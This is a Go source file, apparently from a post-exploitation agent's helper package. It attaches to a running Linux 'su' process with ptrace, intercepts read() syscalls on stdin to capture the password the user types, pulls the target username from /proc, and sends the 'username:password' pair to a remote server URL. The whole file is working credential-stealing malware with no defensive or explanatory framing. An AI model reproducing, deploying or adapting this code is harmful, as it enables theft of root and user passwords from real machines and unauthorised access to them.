//go:build linux

package agent_helper

import (
	"context"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
)

func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]interface{}, pid int) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	if err := syscall.PtraceAttach(pid); err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var wstatus syscall.WaitStatus
	var inSyscall bool

	for {
		if ctx.Err() != nil {
			return
		}

		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}
		if ctx.Err() != nil {
			return
		}
		if wstatus.Exited() {
			return
		}

		if wstatus.StopSignal() == syscall.SIGTRAP {
			inSyscall = !inSyscall

			var regs syscall.PtraceRegs
			if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
				return
			}

			// Capture read-from-stdin on syscall exit when the buffer has been filled
			if regs.Orig_rax == 0 && regs.Rdi == 0 && !inSyscall {
				bytesRead := int(regs.Rax)
				if bytesRead > 0 && bytesRead < 250 {
					buffer := make([]byte, bytesRead)
					if _, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer); err != nil {
						syscall.PtraceSyscall(pid, 0)
						continue
					}

					if strings.Contains(string(buffer), "\n") {
						password := strings.Split(string(buffer), "\n")[0]
						password = RemoveNonPrintableAscii(password)
						if IsValidPassword(password) {
							username := extractSUUsername(pid)
							go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
						}
					}
				}
			}
		}

		if err := syscall.PtraceSyscall(pid, 0); err != nil {
			return
		}
	}
}

func extractSUUsername(pid int) string {
	username := "root"
	cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return username
	}
	if len(cmdline) > 3 {
		parts := strings.Split(string(cmdline), "\x00")
		if len(parts) > 1 && len(parts[1]) > 0 {
			username = parts[1]
		} else {
			username = strings.TrimRight(string(cmdline[3:]), "\x00")
		}
		username = RemoveNonPrintableAscii(username)
	}
	return username
}
